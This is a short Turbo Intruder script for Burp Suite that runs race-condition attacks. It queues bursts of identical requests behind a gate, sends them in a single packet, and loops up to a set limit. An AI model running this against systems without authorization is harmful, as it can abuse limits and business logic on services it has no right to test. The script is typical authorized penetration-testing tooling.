########
#Tuning#
raceCount = 20 # Increase / Decrease this to mess with the number of requsets inside a single-packet
totalRunsMax = 50 # Increase / Decrease this to mess with how many attempts the script will make

reqNum = 0
id = 0
totalRuns = 0
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    global id
    global totalRuns
    id += 1
    totalRuns +=1
    print("Loop number -> "+str(totalRuns))
    for i in range(raceCount):
        engine.queue(target.req, gate='race'+str(id))

    engine.openGate('race'+str(id))


def handleResponse(req, interesting):
    global reqNum
    if 'HTTP/1' not in req.response:
        reqNum += 1
    else:
        table.add(req)
    # Exit if we have looped too many times....
    if totalRuns == totalRunsMax:
        print("Exiting because this has run for too long....")
        exit()
    # If we have not hit the limit defined by "totalRunsMax" try again!
    elif reqNum == raceCount:
        queueRequests(target, wordlists)
        reqNum = 0
